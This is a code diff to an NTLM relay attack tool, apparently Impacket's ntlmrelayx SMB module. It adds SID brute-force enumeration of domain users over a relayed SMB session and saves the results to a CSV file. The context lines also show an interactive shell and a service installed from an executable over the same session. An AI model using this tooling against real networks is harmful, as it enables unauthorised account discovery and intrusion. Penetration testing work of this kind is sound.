@@ -59,6 +59,20 @@ class SMBAttack(ProtocolAttack):
             self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)
             self.shell.cmdloop()
             return
+        if self.config.enumDomain:
+            from impacket.examples.ntlmrelayx.utils.enum import EnumDomain
+            try:
+                LOG.info("Enumerate domain though SID Bruteforce...")
+                enumDomain = EnumDomain(self.__SMBConnection)
+                domainUsers = enumDomain.enumerateDomain()
+                with open("domain_enum.csv","w+") as f:
+                    for domainUser in domainUsers:
+                        (sid, domain, username, usage) = domainUser
+                        LOG.debug( "%s: %s\\%s (%s)" % (sid, domain, username,usage))
+                        f.write("%s,%s\\%s,%s\n" % (sid, domain, username,usage))
+                LOG.info("Bruteforce finish! Results written in domain_enum.csv")
+            except Exception as e:
+                LOG.error(str(e))
         if self.config.exeFile is not None:
             result = self.installService.install()
             if result is True:
